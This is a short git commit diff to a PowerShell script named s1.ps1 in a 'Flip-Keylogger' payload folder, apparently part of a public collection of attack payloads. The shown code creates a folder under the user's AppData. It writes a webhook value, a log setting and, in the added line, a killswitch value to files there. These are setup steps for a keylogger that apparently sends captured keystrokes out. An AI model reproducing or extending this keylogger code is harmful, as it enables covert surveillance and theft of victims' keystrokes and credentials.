af01db9e4f4f3bfd670c6a437db59ae97a4af25c
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-24 16:45:39 -0600

    Update s1.ps1

--- Payloads/Flip-Keylogger/s1.ps1
+++ Payloads/Flip-Keylogger/s1.ps1
@@ -1,6 +1,7 @@
 if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"};
 echo $dc > "$env:appdata\-locker\wh.txt";
 echo $log > "$env:appdata\-locker\log.txt";
+echo $ks > "$env:appdata\-locker\killswitch.txt";
 
 function s1 {
 	$user = "$env:COMPUTERNAME\$env:USERNAME"
